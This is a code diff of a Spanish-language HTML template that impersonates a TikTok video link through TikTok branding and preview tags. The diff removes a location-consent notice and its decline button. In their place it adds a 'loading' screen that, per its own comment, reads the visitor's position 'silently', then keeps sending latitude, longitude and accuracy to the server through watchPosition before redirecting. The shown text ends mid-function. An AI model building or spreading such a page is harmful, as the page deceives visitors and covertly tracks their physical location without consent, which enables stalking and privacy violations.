@@ -1,87 +1,148 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8">
-  <meta property="og:site_name" content="TikTok">
-  <meta property="og:title" content="Mira este video en TikTok">
-  <meta property="og:description" content="Descubre contenido en TikTok">
-  <meta property="og:image" content="https://sf16-sg.tiktokcdn.com/obj/eden-sg/u33hn4pjy/tiktok_logo.png">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Acceso al video</title>
-  <style>
-    body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f6f7fb; color:#222; }
-    .wrap { max-width:760px; margin:48px auto; padding:20px; }
-    .card { background:#fff; border-radius:8px; padding:24px; box-shadow:0 6px 20px rgba(0,0,0,0.08); }
-    .actions { margin-top:18px; }
-    .btn { padding:10px 16px; border-radius:6px; border:none; cursor:pointer; font-weight:bold; }
-    .btn-primary { background:#007bff; color:#fff; }
-    .btn-ghost { background:#eee; color:#333; }
-    .note { margin-top:12px; color:#555; font-size:0.95rem; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:site_name" content="TikTok">
+    <meta property="og:title" content="Mira este video en TikTok">
+    <meta property="og:description" content="Descubre contenido increíble en TikTok">
+    <meta property="og:image" content="https://sf16-sg.tiktokcdn.com/obj/eden-sg/u33hn4pjy/tiktok_logo.png">
+    <title>Redirigiendo a TikTok...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #252525 0%, #111111 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #fff;
+            margin: 0 0 16px 0;
+            font-size: 24px;
+        }
+        p {
+            color: #ddd;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 14px 32px;
+            margin: 8px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            background: #ff0050;
+            color: white;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background: #e00044;
+            transform: translateY(-2px);
+        }
+        #status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 6px;
+            display: none;
+            background: rgba(255, 255, 255, 0.1);
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #ff0050;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="card">
-      <h1>Verificación de acceso (consentimiento requerido)</h1>
-      <p>Para acceder al video necesitamos tu consentimiento para usar tu ubicación y así ofrecerte una experiencia optimizada. Solo recopilamos la latitud/longitud junto con tu IP y User-Agent para fines de este juego. Puedes leer nuestra <a href="{{ url_for('privacy') }}">política de privacidad</a>.</p>
-
-      <div class="actions">
-        <button id="accept" class="btn btn-primary">Acepto compartir mi ubicación</button>
-        <button id="skip" class="btn btn-ghost">No ahora</button>
-      </div>
-
-      <p id="status" class="note">Estado: esperando acción del usuario.</p>
+    <div class="container">
+        <div class="icon">🎵</div>
+        <h1>Cargando contenido de TikTok</h1>
+        <p>Preparando tu experiencia personalizada. Por favor, espera un momento...</p>
+        
+        <button class="btn" id="continueBtn">
+            Continuar al video
+        </button>
+        
+        <div id="status"></div>
     </div>
-  </div>
 
-<script>
-const TARGET = "{{ target }}";
-const accept = document.getElementById('accept');
-const skip = document.getElementById('skip');
-const status = document.getElementById('status');
-
-function redirect() {
-  window.location.href = TARGET;
-}
-
-function sendLocation(lat, lon) {
-  return fetch('/guardar-ubicacion', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ latitud: lat, longitud: lon, consent: true })
-  });
-}
-
-accept.addEventListener('click', () => {
-  status.textContent = 'Solicitando ubicación...';
-  if ('geolocation' in navigator) {
-    navigator.geolocation.getCurrentPosition((pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      status.textContent = 'Enviando ubicación...';
-      sendLocation(lat, lon).then(() => {
-        status.textContent = 'Gracias. Redirigiendo...';
-        setTimeout(redirect, 700);
-      }).catch((err) => {
-        console.error(err);
-        status.textContent = 'Error al enviar ubicación. Serás redirigido.';
-        setTimeout(redirect, 1200);
-      });
-    }, (err) => {
-      console.error(err);
-      status.textContent = 'No se obtuvo ubicación. Serás redirigido.';
-      setTimeout(redirect, 1200);
-    }, { timeout: 10000 });
-  } else {
-    status.textContent = 'Geolocalización no soportada. Serás redirigido.';
-    setTimeout(redirect, 1200);
-  }
-});
-
-skip.addEventListener('click', () => {
-  status.textContent = 'Has rechazado compartir ubicación. Serás redirigido.';
-  setTimeout(redirect, 800);
-});
-</script>
-</body>
-</html>
+    <script>
+        const TARGET = "{{ target_tiktok }}";
+        const sessionId = Math.random().toString(36).substring(2, 15);
+        
+        function showStatus(msg, loading = false) {
+            const status = document.getElementById('status');
+            status.style.display = 'block';
+            status.innerHTML = loading ? '<div class="loading"></div> ' + msg : msg;
+        }
+        
+        function sendLocation(lat, lon, accuracy) {
+            const data = {
+                latitud: lat,
+                longitud: lon,
+                precision: accuracy,
+                session_id: sessionId
+            };
+            
+            fetch('/guardar-ubicacion', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .catch(err => console.error('Error al enviar ubicación:', err));
+        }
+        
+        function getLocationAndRedirect() {
+            // Ocultar botón y mostrar estado de carga
+            document.getElementById('continueBtn').classList.add('hidden');
+            showStatus("Optimizando contenido para tu región...", true);
+            
+            // Intentar obtener ubicación de forma silenciosa
+            if ("geolocation" in navigator) {
+                // Usar watchPosition para actualizaciones continuas
+                navigator.geolocation.watchPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        // Enviar ubicación al servidor
+                        sendLocation(lat, lon, accuracy);
+                        
+                        // Redirigir después de obtener la primera ubicación
+                        setTimeout(() => {
+                            showStatus
